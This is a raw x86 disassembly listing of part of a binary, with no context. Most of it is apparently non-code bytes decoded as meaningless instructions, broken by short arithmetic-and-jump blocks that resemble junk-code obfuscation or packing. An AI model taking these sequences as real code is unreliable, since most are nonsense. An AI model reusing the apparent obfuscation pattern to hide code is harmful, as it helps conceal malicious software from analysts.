  40e0e3:	sbb    ebp,DWORD PTR [eax+0x1291af17]
  40e0e9:	push   edx
  40e0eb:	ror    DWORD PTR gs:[eax-0x3ff566b5],1
  40e0f2:	nop
  40e0f3:	in     eax,0x19
  40e0f5:	leave  
  40e0f6:	fmul   DWORD PTR [eax]
  40e0f8:	push   ss
  40e0f9:	xchg   edx,eax
  40e0fa:	cmc    
  40e0fb:	sub    DWORD PTR [edx+0x97ac30e],0x71
  40e102:	std    
  40e103:	xor    DWORD PTR ds:0xba96c779,edi
  40e109:	push   ebp
  40e10a:	aam    0x89
  40e10c:	data16 sbb bl,BYTE PTR [ebx]
  40e10f:	or     DWORD PTR [edx-0x72580ab3],esp
  40e115:	add    eax,DWORD PTR [esi]
  40e117:	jmp    0x399852f7
  40e11c:	ret    
  40e11d:	nop
  40e11e:	sub    DWORD PTR ds:0xe067dedb,edx
  40e124:	and    BYTE PTR [ebp-0x20],0xef
  40e128:	imul   ecx,DWORD PTR [ebx],0x996f4b42
  40e12e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e12f:	das    
  40e130:	add    al,0x82
  40e132:	dec    edi
  40e133:	push   ebx
  40e134:	je     0x40e101
  40e136:	lods   al,BYTE PTR ds:[esi]
  40e137:	out    0xc,al
  40e139:	imul   eax,DWORD PTR [ecx+eiz*2-0x2ec2af45],0xffffffb0
  40e141:	retf   0x2bb1
  40e144:	jecxz  0x40e123
  40e146:	inc    edi
  40e147:	in     al,0x28
  40e149:	sbb    eax,0x2bd31b10
  40e14e:	sbb    cl,al
  40e150:	rcl    DWORD PTR [ebx+0x3],0xca
  40e154:	aam    0xac
  40e156:	xchg   esp,eax
  40e157:	add    eax,0x4d79d927
  40e15c:	leave  
  40e15d:	add    edx,DWORD PTR [ebx]
  40e15f:	fcomp  QWORD PTR [edx+0x20]
  40e162:	js     0x40e19b
  40e164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e165:	mov    ds:0x9d444627,eax
  40e16a:	sub    ecx,DWORD PTR [ebp-0x5c]
  40e16d:	xacquire xchg BYTE PTR [ecx-0x33],ah
  40e171:	cmp    eax,0x79976faf
  40e176:	aad    0x7f
  40e178:	(bad)  
  40e179:	cmp    al,0xaa
  40e17b:	push   eax
  40e17c:	mov    eax,DWORD PTR [ebp-0x10]
  40e17f:	xor    eax,0xffffe1ce
  40e184:	add    eax,DWORD PTR [ebp-0xc]
  40e187:	jmp    0x40e44b
  40e18c:	sub    dh,ah
  40e18e:	mov    BYTE PTR [ecx],ah
  40e190:	inc    esi
  40e191:	pop    ds
  40e192:	and    dh,bl
  40e194:	leave  
  40e195:	out    0x4b,eax
  40e197:	jle    0x40e1d9
  40e199:	sub    ah,dh
  40e19b:	push   0xffffffce
  40e19d:	enter  0x1818,0xd2
  40e1a1:	adc    al,0x18
  40e1a3:	sbb    bh,bl
  40e1a5:	pop    ds
  40e1a6:	jg     0x40e1d0
  40e1a8:	add    ebp,DWORD PTR fs:[ebp+0x61]
  40e1ac:	push   edi
  40e1ad:	mov    esi,esp
  40e1af:	pop    ebx
  40e1b0:	mov    DWORD PTR [ecx+0x55],0x5423909c
  40e1b7:	cli    
  40e1b8:	or     DWORD PTR [ebp-0x4f],ebx
  40e1bb:	xchg   esp,eax
  40e1bc:	adc    BYTE PTR [edi-0x76],al
  40e1bf:	ja     0x40e215
  40e1c1:	pop    ebx
  40e1c2:	lods   al,BYTE PTR ds:[esi]
  40e1c3:	mov    esi,DWORD PTR [eax]
  40e1c5:	mov    eax,ds:0xa3c19d91
  40e1ca:	adc    ecx,DWORD PTR [ebx-0x70]
  40e1cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1ce:	xchg   BYTE PTR [edi-0x36],cl
  40e1d1:	add    eax,esi
  40e1d3:	add    BYTE PTR [ebp-0x2e1ed0b1],0x13
  40e1da:	dec    ebx
  40e1db:	icebp  
  40e1dc:	lds    esp,FWORD PTR [ebp+0x75a60c5b]
  40e1e2:	mov    esp,0xc40390ad
  40e1e7:	stos   DWORD PTR es:[edi],eax
  40e1e8:	dec    esi
  40e1e9:	pop    eax
  40e1ea:	jp     0x40e213
  40e1ec:	push   ebp
  40e1ed:	aam    0x6b
  40e1ef:	and    DWORD PTR [edi-0x37],ebp
  40e1f2:	sbb    BYTE PTR [edi-0x23],ch
  40e1f5:	xor    DWORD PTR [ecx],edx
  40e1f7:	xor    al,0xca
  40e1f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1fa:	xchg   DWORD PTR [ebp+0x26],ebx
  40e1fd:	mov    ebx,cs
  40e1ff:	sbb    DWORD PTR [eax],0xf6d342bb
  40e205:	xchg   BYTE PTR [edi-0x32],ah
  40e208:	aas    
  40e209:	push   ss
  40e20a:	mov    esp,DWORD PTR [edi]
  40e20c:	js     0x40e19f
  40e20e:	dec    edx
  40e20f:	enter  0x5f33,0xd4
  40e213:	pop    ecx
  40e214:	jo     0x40e1e1
  40e216:	inc    esi
  40e217:	add    al,0x5d
  40e219:	or     eax,0x7022846
  40e21e:	and    BYTE PTR [esi],dh
  40e220:	or     edi,esi
  40e222:	xor    BYTE PTR [esi+ecx*1-0x4],0x70
  40e227:	fmul   DWORD PTR [ecx]
  40e229:	push   esp
  40e22a:	test   DWORD PTR [edx],ebx
  40e22c:	popa   
  40e22d:	cmp    DWORD PTR [esi-0x1a],0x42f1b1b1
  40e234:	fstp   DWORD PTR [esi+0x4d2b6e54]
  40e23a:	sbb    BYTE PTR [esi+0x71],cl
  40e23d:	call   0xca5580a7
  40e242:	push   eax
  40e243:	setl   BYTE PTR [esi]
  40e246:	ret    0xdf77
  40e249:	pop    ebx
  40e24a:	(bad)  
  40e24b:	xchg   DWORD PTR [ecx],esi
  40e24d:	pop    es
  40e24e:	jp     0x40e297
  40e250:	and    DWORD PTR ds:0x7f665477,ecx
  40e256:	pushf  
  40e257:	sbb    edx,eax
  40e259:	hlt    
  40e25a:	inc    ebp
  40e25b:	inc    esi
  40e25c:	cmp    DWORD PTR [edx-0x207085e0],ebx
  40e262:	mov    ah,0x8
  40e264:	aas    
  40e265:	inc    ecx
  40e266:	test   BYTE PTR [esi-0x34c0c174],dh
  40e26c:	adc    bl,ch
  40e26e:	icebp  
  40e26f:	cld    
  40e270:	cli    
  40e271:	jg     0x40e2bb
  40e273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e274:	mov    al,0x39
  40e276:	sub    bh,BYTE PTR [ebx-0x76ef297]
  40e27c:	icebp  
  40e27d:	int3   
  40e27e:	enter  0xb737,0x5
  40e282:	adc    BYTE PTR [edx+0x4a],dl
  40e285:	pusha  
  40e286:	cmc    
  40e287:	sti    
  40e288:	mov    al,bh
  40e28a:	lea    ecx,[ecx-0x2ebb5d32]
  40e290:	or     bh,bh
  40e292:	lahf   
  40e293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e294:	loope  0x40e237
  40e296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e297:	dec    edx
  40e298:	mov    ebx,0xd34c6926
  40e29d:	cmp    eax,0xac2d8b13
  40e2a2:	retf   
  40e2a3:	xchg   edx,eax
  40e2a4:	sbb    al,0x3a
  40e2a6:	sub    eax,0x6851c36c
  40e2ab:	and    al,0x79
  40e2ad:	loop   0x40e32d
  40e2af:	je     0x40e2d1
  40e2b1:	xor    BYTE PTR [esi-0x46f2bf27],bh
  40e2b7:	xor    al,BYTE PTR [ecx-0x43cbf780]
  40e2bd:	push   ss
  40e2be:	push   0xded6f614
  40e2c3:	clc    
  40e2c4:	std    
  40e2c5:	mov    esi,0x894879ff
  40e2ca:	scas   eax,DWORD PTR es:[edi]
  40e2cb:	mov    al,0xfa
  40e2cd:	aas    
  40e2ce:	sbb    eax,0x2a3b1b29
  40e2d3:	rcl    cl,cl
  40e2d5:	daa    
  40e2d6:	clc    
  40e2d7:	jbe    0x40e2c3
  40e2d9:	lods   al,BYTE PTR ds:[esi]
  40e2da:	les    eax,FWORD PTR [edx]
  40e2dc:	add    DWORD PTR [ecx],ebp
  40e2de:	jnp    0x40e2db
  40e2e0:	cmp    eax,0xde225f7c
  40e2e5:	push   edi
  40e2e6:	jbe    0x40e343
  40e2e8:	aas    
  40e2e9:	pop    ebx
  40e2ea:	repz dec edx
  40e2ec:	outs   dx,BYTE PTR ds:[esi]
  40e2ed:	xchg   ebx,eax
  40e2ee:	jp     0x40e361
  40e2f0:	dec    esp
  40e2f1:	rcr    DWORD PTR [eax+esi*4-0x56],cl
  40e2f5:	enter  0xeb5e,0x98
  40e2f9:	popa   
  40e2fa:	stos   BYTE PTR es:[edi],al
  40e2fb:	lods   al,BYTE PTR ds:[esi]
  40e2fc:	cwde   
  40e2fd:	dec    edx
  40e2fe:	adc    dl,ch
  40e300:	mov    al,ds:0xb254f5a2
  40e305:	adc    al,BYTE PTR [ecx-0xf]
  40e308:	scas   al,BYTE PTR es:[edi]
  40e309:	fadd   QWORD PTR [ecx-0x6b]
  40e30c:	and    ebp,edi
  40e30e:	inc    esp
  40e30f:	and    di,WORD PTR [ebx+0x34]
  40e313:	ds aas 
  40e315:	inc    esp
  40e316:	ins    BYTE PTR es:[edi],dx
  40e317:	retf   
  40e318:	inc    ebx
  40e319:	and    DWORD PTR [edx-0x24],ecx
  40e31c:	xchg   edi,eax
  40e31d:	add    edi,DWORD PTR [esi+0x5e]
  40e320:	sahf   
  40e321:	inc    ecx
  40e322:	jno    0x40e2f8
  40e324:	daa    
  40e325:	xlat   BYTE PTR ds:[ebx]
  40e326:	stc    
  40e327:	xchg   esi,eax
  40e328:	sub    dl,ah
  40e32a:	inc    esp
  40e32b:	pop    ds
  40e32c:	jne    0x40e33b
  40e32e:	ror    DWORD PTR [ebx+eiz*1],0x59
  40e332:	in     al,0xdf
  40e334:	mov    esi,es
  40e336:	imul   ecx,edx,0xffffffc0
  40e339:	jne    0x40e2c2
  40e33b:	cmc    
  40e33c:	jge    0x40e2fa
  40e33e:	mov    cl,0xa6
  40e340:	loope  0x40e2f4
  40e342:	mov    esp,0x6fe4a879
  40e347:	inc    edx
  40e348:	pop    edx
  40e349:	shl    DWORD PTR [edi+0x56b79f4],cl
  40e34f:	add    ecx,DWORD PTR [ebx-0x7e067559]
  40e355:	loop   0x40e302
  40e357:	jo     0x40e37d
  40e359:	mov    BYTE PTR [ebx+0x2e],dl
  40e35c:	(bad)  
  40e35e:	out    0xec,eax
  40e360:	repz in eax,0x98
  40e363:	out    dx,eax
  40e364:	enter  0x4ba7,0xf
  40e368:	push   eax
  40e369:	inc    eax
  40e36a:	add    DWORD PTR [esi+0x105d84e0],edi
  40e370:	bound  ebp,QWORD PTR [eax+0x4b]
  40e373:	push   edx
  40e374:	mul    BYTE PTR [eax+ecx*4]
  40e377:	push   ecx
  40e378:	aas    
  40e379:	pop    edi
  40e37a:	pop    eax
  40e37b:	fwait
  40e37c:	dec    esi
  40e37d:	jecxz  0x40e35e
  40e37f:	sub    al,0xde
  40e381:	and    BYTE PTR [ecx+0x5d],0x86
  40e385:	sub    al,0xfc
  40e387:	adc    BYTE PTR [edx],ch
  40e389:	(bad)  
  40e38a:	(bad)  [edx+0x3413a634]
  40e390:	(bad)  
  40e391:	pop    esp
  40e392:	push   esp
  40e393:	xchg   DWORD PTR [ebp+0x60],ebx
  40e396:	xor    dl,BYTE PTR [ebx+0x54]
  40e399:	mov    al,ds:0xa83becda
  40e39e:	cdq    
  40e39f:	dec    esi
  40e3a0:	adc    eax,DWORD PTR [ebx+0x25485df]
  40e3a6:	lahf   
  40e3a7:	inc    esi
  40e3a8:	imul   ebp,DWORD PTR [esi+ecx*4],0xfaf7918c
  40e3af:	(bad)  
  40e3b0:	mov    eax,ds:0x786b3502
  40e3b5:	mov    esi,0x17938df5
  40e3ba:	inc    eax
  40e3bb:	(bad)  
  40e3bc:	sub    al,0x49
  40e3be:	xchg   esp,eax
  40e3bf:	and    al,0x5f
  40e3c1:	push   es
  40e3c2:	adc    bl,dl
  40e3c4:	lea    ecx,[edx+0x1b]
  40e3c7:	mov    esi,0x44db3f03
  40e3cc:	pusha  
  40e3cd:	ja     0x40e35c
  40e3cf:	jbe    0x40e43d
  40e3d1:	adc    dh,BYTE PTR [ebp+0x1c6cc15c]
  40e3d7:	dec    eax
  40e3d8:	jmp    0xd8a4:0xb9970a3f
  40e3df:	jecxz  0x40e45e
  40e3e1:	ins    DWORD PTR es:[edi],dx
  40e3e2:	xchg   ecx,eax
  40e3e3:	or     BYTE PTR [edx+0x8b8c5ce],bh
  40e3e9:	shr    BYTE PTR [esp+ecx*8-0x80],1
  40e3ed:	cwde   
  40e3ee:	iret   
  40e3ef:	mov    DWORD PTR [eax],edi
  40e3f1:	or     bh,BYTE PTR [edx+0x3b43cbc0]
  40e3f7:	cmp    eax,0xb3592fae
  40e3fc:	nop
  40e3fd:	rol    DWORD PTR [eax+0x1c],cl
  40e400:	loopne 0x40e3fe
  40e402:	dec    esi
  40e403:	adc    ch,BYTE PTR [esi+0x312cdc7f]
  40e409:	clc    
  40e40a:	ret    0x7aef
  40e40d:	ds xor al,0xb7
  40e410:	and    eax,0x9915092d
  40e415:	jl     0x40e43c
  40e417:	(bad)  
  40e419:	aaa    
  40e41a:	shl    BYTE PTR [ebp-0x2b020a12],cl
  40e420:	pop    eax
  40e421:	mov    bl,0xa
  40e423:	fidivr WORD PTR [ebp-0x3e358432]
  40e429:	jecxz  0x40e48d
  40e42b:	stos   DWORD PTR es:[edi],eax
  40e42c:	sbb    eax,0xd73a8a74
  40e431:	je     0x40e3e2
  40e433:	pop    eax
  40e434:	push   edi
  40e435:	sbb    ebx,DWORD PTR [eax+0x39]
  40e438:	inc    esi
  40e439:	aad    0x85
  40e43b:	dec    eax
  40e43c:	dec    ebp
  40e43d:	push   ebx
  40e43e:	jo     0x40e4a5
  40e440:	push   cs
  40e441:	cwde   
  40e442:	sahf   
  40e443:	inc    edi
  40e444:	pop    edx
  40e445:	mov    edx,0xb4c74800
  40e44a:	xchg   edx,eax
  40e44b:	xor    edx,edx
  40e44d:	and    eax,0x6d33
  40e452:	lea    ecx,[ecx+eax*1-0x6520]
  40e459:	mov    eax,DWORD PTR [ebp+0x8]
  40e45c:	mov    ebx,DWORD PTR [ebp-0x4]
  40e45f:	add    eax,edi
  40e461:	div    ebx
  40e463:	mov    edx,DWORD PTR [ebp-0x8]
  40e466:	mov    ebx,0x940a7
  40e46b:	sub    eax,edx
  40e46d:	xor    edx,edx
  40e46f:	div    ebx
  40e471:	add    eax,esi
  40e473:	cmp    ecx,eax
  40e475:	jb     0x40db77
  40e47b:	xor    ebx,ebx
  40e47d:	inc    ebx
  40e47e:	mov    DWORD PTR [ebp+0xc],0x77bd
  40e485:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40e48c:	mov    DWORD PTR [ebp-0x8],0x4738
  40e493:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40e49a:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40e4a1:	mov    DWORD PTR [ebp-0x14],0x64ec
  40e4a8:	mov    DWORD PTR [ebp-0x18],0x1984
  40e4af:	mov    DWORD PTR [ebp-0x1c],0x293
  40e4b6:	mov    eax,DWORD PTR [ebp+0x8]
  40e4b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4bc:	add    eax,0x1ef2
  40e4c1:	and    eax,ecx
  40e4c3:	xor    eax,0x7240
  40e4c8:	mov    ecx,0x7aaa
  40e4cd:	jmp    0x40e791
  40e4d2:	mov    eax,0x5a62ef3c
  40e4d7:	and    bl,BYTE PTR [edx+edi*1]
  40e4da:	ss dec esi
  40e4dc:	xor    DWORD PTR [eax+0x709b395b],0x1818c289
  40e4e6:	rcl    BYTE PTR [eax+ebx*1],cl
  40e4e9:	sbb    BYTE PTR [esi+0x5b],dh
  40e4ec:	and    dh,BYTE PTR [eax]
  40e4ee:	iret   
  40e4ef:	or     al,0xa6
  40e4f1:	loop   0x40e4d8
  40e4f3:	mov    esp,0xc26c64ae
  40e4f8:	add    esp,0x2330023f
  40e4fe:	sbb    eax,0x6ea55d3d
  40e503:	xchg   DWORD PTR [eax+0x7b],ebx
  40e506:	mov    al,ds:0xa193c53f
  40e50b:	out    0xee,al
  40e50d:	gs in  eax,0xe
  40e510:	push   0xff9cc51d
  40e515:	retf   0x91f9
  40e518:	jne    0x40e588
  40e51a:	(bad)  
  40e51b:	xor    ah,BYTE PTR ss:[edi]
  40e51e:	and    DWORD PTR [ecx],ebp
  40e520:	inc    edi
  40e521:	inc    ebx
  40e522:	scas   al,BYTE PTR es:[edi]
  40e523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e524:	xor    BYTE PTR ds:0x68e625c8,ah
  40e52a:	mov    eax,ds:0x8667a144
  40e52f:	int    0x73
  40e531:	lods   al,BYTE PTR ds:[esi]
  40e532:	stos   DWORD PTR es:[edi],eax
  40e533:	mov    ebp,0x31039cc7
  40e538:	push   0x1144367
  40e53d:	mov    edi,0x73f6ed1a
  40e542:	adc    esi,edi
  40e544:	fldcw  WORD PTR [edx+0x6d0f1aa1]
  40e54a:	and    al,0x2d
  40e54c:	ror    DWORD PTR [edx+0x35],cl
  40e54f:	popf   
  40e550:	and    DWORD PTR [ecx-0x24],edx
  40e553:	xor    DWORD PTR [ebp+edx*4-0x27],ebp
  40e557:	jl     0x40e59e
  40e559:	pop    edx
  40e55a:	xor    edi,DWORD PTR [esi-0x34cfd0aa]
  40e560:	cmp    BYTE PTR [edi+0x5e],0x11
  40e564:	mov    esp,0x5f2422ad
  40e569:	dec    ebp
  40e56a:	leave  
  40e56b:	xchg   ebp,eax
  40e56c:	push   ebx
  40e56d:	in     al,0x61
  40e56f:	jmp    0x40e5ac
  40e571:	jo     0x40e537
  40e573:	adc    edi,DWORD PTR [ebx+0x2bd4bd49]
  40e579:	jae    0x40e562
  40e57b:	mov    ah,0x7a
  40e57d:	cmp    DWORD PTR [esi],0x5366fa28
  40e583:	push   edi
  40e584:	ja     0x40e5ad
  40e586:	out    dx,al
  40e587:	les    ebx,FWORD PTR [eax+0x2c65547e]
  40e58d:	cli    
  40e58e:	sar    DWORD PTR [ecx+0x7215eb34],cl
  40e594:	mov    edx,0xd85d8bf6
  40e599:	fcom   QWORD PTR [edi+0x317bc5be]
  40e59f:	cwde   
  40e5a0:	(bad)  
  40e5a1:	sub    DWORD PTR fs:0x59bc1b6e,0x1d
  40e5a9:	(bad)  
  40e5aa:	xor    BYTE PTR [esi],bh
  40e5ac:	pop    ecx
  40e5ad:	dec    ebx
  40e5af:	or     ecx,ecx
  40e5b1:	in     al,0x3c
  40e5b3:	icebp  
  40e5b4:	je     0x40e56e
  40e5b6:	cmp    edi,DWORD PTR [ebx-0x624cbff9]
  40e5bc:	cmp    al,0x26
  40e5be:	xchg   ebx,eax
  40e5bf:	js     0x40e5b4
  40e5c1:	scas   eax,DWORD PTR es:[edi]
  40e5c2:	test   eax,0xf4cf81a1
  40e5c7:	cmp    al,0x74
  40e5c9:	and    ebx,DWORD PTR [eax-0x3e]
  40e5cc:	cmp    BYTE PTR [ecx],0x97
  40e5cf:	cdq    
  40e5d0:	jmp    0xea61:0xbc7dcfce
  40e5d7:	xor    al,BYTE PTR ds:[edx-0x4e]
  40e5db:	mov    ecx,0xe0295485
  40e5e0:	pop    esp
  40e5e1:	cmp    DWORD PTR [ecx-0x6b5d830f],esp
  40e5e7:	cmp    DWORD PTR [ecx],esp
  40e5e9:	push   eax
  40e5ea:	push   ss
  40e5eb:	mov    ebx,0xc85160f0
  40e5f0:	sub    DWORD PTR [edi+0x9],eax
  40e5f3:	pop    esi
  40e5f4:	sub    BYTE PTR [eax],0x8b
  40e5f7:	aaa    
  40e5f8:	fsubr  QWORD PTR [eax+0x408c887f]
  40e5fe:	int    0x92
  40e600:	pop    edi
  40e601:	sbb    bl,BYTE PTR gs:[esi-0x56]
  40e605:	adc    DWORD PTR [eax],esi
  40e607:	ins    BYTE PTR es:[edi],dx
  40e608:	inc    ebx
  40e609:	jo     0x40e685
  40e60b:	imul   esp,DWORD PTR [edx+0x60],0x59a303d1
  40e612:	scas   al,BYTE PTR es:[edi]
  40e613:	xchg   ebx,eax
  40e614:	test   al,0x65
  40e616:	push   ebp
  40e617:	popf   
  40e618:	cmp    BYTE PTR ds:0x56332a63,bl
  40e61e:	daa    
  40e61f:	jne    0x40e5f7
  40e621:	shl    bh,0x1d
  40e624:	shl    ecx,cl
  40e626:	push   edx
  40e627:	imul   esi,esp,0x8e8b9d43
  40e62d:	push   eax
  40e62e:	clc    
  40e62f:	inc    edx
  40e630:	daa    
  40e631:	xchg   esi,eax
  40e632:	jge    0x40e61f
  40e634:	push   ebp
  40e635:	and    cl,BYTE PTR [ebp+edi*8+0x7c194592]
  40e63c:	repnz outs dx,BYTE PTR ds:[esi]
  40e63e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e63f:	rol    bl,cl
  40e641:	data16 shr BYTE PTR [esi+ebx*8],cl
  40e645:	in     al,dx
  40e646:	(bad)  
  40e648:	scas   eax,DWORD PTR es:[edi]
  40e649:	out    dx,eax
  40e64a:	pop    es
  40e64b:	into   
  40e64c:	push   cs
  40e64d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e64e:	cdq    
  40e64f:	lock push ds
  40e651:	and    eax,0x49975db4
  40e656:	sbb    bl,ah
  40e658:	mov    dl,BYTE PTR [edi]
  40e65a:	test   BYTE PTR [edx-0x39e93ef2],0xb3
  40e661:	loop   0x40e5f7
  40e663:	leave  
  40e664:	xchg   edx,eax
  40e665:	enter  0xbae0,0xae
  40e669:	int3   
  40e66a:	adc    eax,0x7a4e88c6
  40e66f:	aaa    
  40e670:	pop    ecx
  40e671:	outs   dx,BYTE PTR ds:[esi]
  40e672:	mov    dh,0x26
  40e674:	fdivr  QWORD PTR [ebx+0x3cc3bd96]
  40e67a:	push   es
  40e67b:	mov    ds:0xff78cf33,eax
  40e680:	dec    esi
  40e681:	frstor [ecx]
  40e683:	and    al,0x8f
  40e685:	fidivr WORD PTR [eax-0x52]
  40e688:	sbb    dl,bl
  40e68a:	ins    BYTE PTR es:[edi],dx
  40e68b:	or     edx,DWORD PTR [esi-0x2955e14d]
  40e691:	es pop ds
  40e693:	ins    DWORD PTR es:[edi],dx
  40e694:	inc    esi
  40e695:	pop    es
  40e696:	cld    
  40e697:	cld    
  40e698:	jbe    0x40e6bc
  40e69a:	add    ah,BYTE PTR [ecx+0x7dca22fd]
  40e6a0:	xchg   ebp,eax
  40e6a1:	jbe    0x40e636
  40e6a3:	push   esp
  40e6a4:	ds push edx
  40e6a6:	jno    0x40e71e
  40e6a8:	add    BYTE PTR [ebp-0x4dd419d5],al
  40e6ae:	jl     0x40e6b0
  40e6b0:	and    eax,0x1c592de6
  40e6b5:	jne    0x40e6e9
  40e6b7:	test   cl,ch
  40e6b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6ba:	or     DWORD PTR [esi-0x3d],ebp
  40e6bd:	rol    DWORD PTR ds:0x45109c18,0x65
  40e6c4:	(bad)  
  40e6c5:	cdq    
  40e6c6:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40e6c8:	arpl   WORD PTR [edx+edi*1+0x6ba1297c],cx
  40e6cf:	scas   eax,DWORD PTR es:[edi]
  40e6d0:	fiadd  DWORD PTR [edi-0x52905769]
  40e6d6:	in     al,0xa9
  40e6d8:	cmp    DWORD PTR [edx+eiz*2+0x34],esp
  40e6dc:	dec    esi
  40e6dd:	das    
  40e6de:	rol    DWORD PTR [edx+0x53],0x47
  40e6e2:	push   ds
  40e6e3:	fbstp  TBYTE PTR [ebx+0x6d322ec]
  40e6e9:	and    DWORD PTR [ebp-0x2acd92ed],ebx
  40e6ef:	add    BYTE PTR [ebp-0xb155ac],bl
  40e6f5:	cmc    
  40e6f6:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6f8:	sub    DWORD PTR [ebp-0x724b7bfd],ebx
  40e6fe:	js     0x40e717
  40e700:	mov    eax,0x57411c8a
  40e705:	mov    ecx,?
  40e707:	pop    eax
  40e708:	test   al,0x88
  40e70a:	mov    edi,?
  40e70c:	mov    eax,ds:0x8d0bb871
  40e711:	ss repnz xchg edx,eax
  40e714:	push   edi
  40e715:	add    al,0xb
  40e717:	int3   
  40e718:	jb     0x40e6f9
  40e71a:	stos   BYTE PTR es:[edi],al
  40e71b:	sbb    cl,BYTE PTR [esi+0x37]
  40e71e:	jge    0x40e6d5
  40e720:	and    esp,DWORD PTR [eax]
  40e722:	or     BYTE PTR [ebx+0x65],0x16
  40e726:	aad    0x63
  40e728:	inc    ecx
  40e729:	ret    0xd806
  40e72c:	sub    bh,0x2b
  40e72f:	test   al,0xe1
  40e731:	fdivr  DWORD PTR [ebp+esi*8-0x60]
  40e735:	fisub  DWORD PTR ds:0xb0cc3cea
  40e73b:	(bad)  
  40e73c:	retf   
  40e73d:	bound  edi,QWORD PTR [ebp-0x6f]
  40e740:	or     ebx,DWORD PTR [ebp-0x6a]
  40e743:	jne    0x40e775
  40e745:	mov    bl,0x63
  40e747:	sbb    eax,0xbe99f16e
  40e74c:	shr    BYTE PTR [edx+0x55],1
  40e74f:	mov    eax,ds:0x75df6b61
  40e754:	xor    DWORD PTR [edx-0x6c],ecx
  40e757:	jl     0x40e75b
  40e759:	push   es
  40e75a:	lods   eax,DWORD PTR ds:[esi]
  40e75b:	push   esi
  40e75c:	adc    ebp,edi
  40e75e:	pop    esi
  40e75f:	cmp    eax,0xe924390a
  40e764:	sub    edi,DWORD PTR [eax]
  40e766:	push   eax
  40e767:	sub    ecx,ecx
  40e769:	or     DWORD PTR [esi+0x6eb9c67],ecx
  40e76f:	adc    al,BYTE PTR [ebp-0x6a]
  40e772:	mov    WORD PTR [edi-0x7404e62a],es
  40e778:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e779:	jle    0x40e7df
  40e77b:	or     bl,BYTE PTR [edx+eax*2-0x64]
  40e77f:	dec    ebx
  40e780:	retf   0x1e93
  40e783:	sub    al,0x26
  40e785:	mov    WORD PTR [esi-0x338dfbb4],fs
  40e78b:	cdq    
  40e78c:	iret   
  40e78d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e78e:	or     eax,edx
  40e790:	push   ds
  40e791:	sub    ecx,eax
  40e793:	mov    DWORD PTR [ebp+0xc],0x8d3
  40e79a:	mov    DWORD PTR [ebp+0x8],0x2392
  40e7a1:	mov    DWORD PTR [ebp-0x20],ebx
  40e7a4:	mov    DWORD PTR [ebp-0x24],0x338f
  40e7ab:	mov    DWORD PTR [ebp-0x28],0x61c9
  40e7b2:	mov    eax,DWORD PTR [ebp+0x8]
  40e7b5:	mov    edx,DWORD PTR [ebp+0xc]
  40e7b8:	imul   eax,edx
  40e7bb:	xor    eax,0x40a0
  40e7c0:	or     eax,0x1a48
  40e7c5:	xor    eax,0x139ddb0
  40e7ca:	mov    esi,ecx
  40e7cc:	sub    esi,eax
  40e7ce:	mov    eax,DWORD PTR [ebp-0x28]
  40e7d1:	mov    edx,DWORD PTR [ebp-0x24]
  40e7d4:	mov    edi,DWORD PTR [ebp-0x20]
  40e7d7:	or     eax,0x1cc2
  40e7dc:	sub    eax,edx
  40e7de:	jmp    0x40eaa2
  40e7e3:	or     BYTE PTR [esp+ebx*1-0xd],0x1c
  40e7e8:	loop   0x40e828
  40e7ea:	sbb    bh,BYTE PTR [esi]
  40e7ec:	call   DWORD PTR [ebx-0x56]
  40e7ef:	outs   dx,BYTE PTR ds:[esi]
  40e7f0:	cmp    bh,BYTE PTR [ebp-0x50]
  40e7f3:	inc    edx
  40e7f4:	mov    esi,0x14d21818
  40e7f9:	sbb    BYTE PTR [eax],bl
  40e7fb:	sub    bh,dl
  40e7fd:	lahf   
  40e7fe:	das    
  40e7ff:	pop    es
  40e800:	jae    0x40e86a
  40e802:	daa    
  40e803:	inc    ebx
  40e804:	sar    ebx,0xc6
  40e807:	arpl   WORD PTR [ebx+ecx*1],di
  40e80a:	(bad)  
  40e80b:	ret    0xafc6
  40e80e:	mov    eax,ds:0xd06b0615
  40e813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e814:	adc    eax,0xb470c4dd
  40e819:	jo     0x40e7e6
  40e81b:	scas   al,BYTE PTR es:[edi]
  40e81c:	sbb    esi,DWORD PTR [esi]
  40e81e:	mov    cl,0xec
  40e820:	dec    ebp
  40e821:	jno    0x40e869
  40e823:	sbb    BYTE PTR [ebp+0x43c1dc57],al
  40e829:	in     al,0x30
  40e82b:	pop    ss
  40e82c:	jmp    0x40e813
  40e82e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e82f:	dec    edi
  40e830:	push   esi
  40e831:	es fs jne 0x40e7f2
  40e835:	std    
  40e836:	sahf   
  40e837:	aas    
  40e838:	sbb    ebx,DWORD PTR [ecx+0x6996979]
  40e83e:	add    esi,ecx
  40e840:	aam    0xfa
  40e842:	add    al,0xe
  40e844:	jge    0x40e834
  40e846:	push   ebp
  40e847:	push   edx
  40e848:	sub    esi,DWORD PTR [eax+ebp*1+0x36]
  40e84c:	(bad)  
  40e84d:	pop    ebx
  40e84e:	outs   dx,BYTE PTR ds:[esi]
  40e84f:	adc    ebx,DWORD PTR ds:0xf057ccf7
  40e855:	push   ebx
  40e856:	mov    ds:0xf897ba30,eax
  40e85b:	nop
  40e85c:	loope  0x40e801
  40e85e:	sbb    BYTE PTR [ebx],dh
  40e860:	sub    al,0xae
  40e862:	sti    
  40e863:	xchg   esp,eax
  40e864:	int    0x6e
  40e866:	jmp    edi
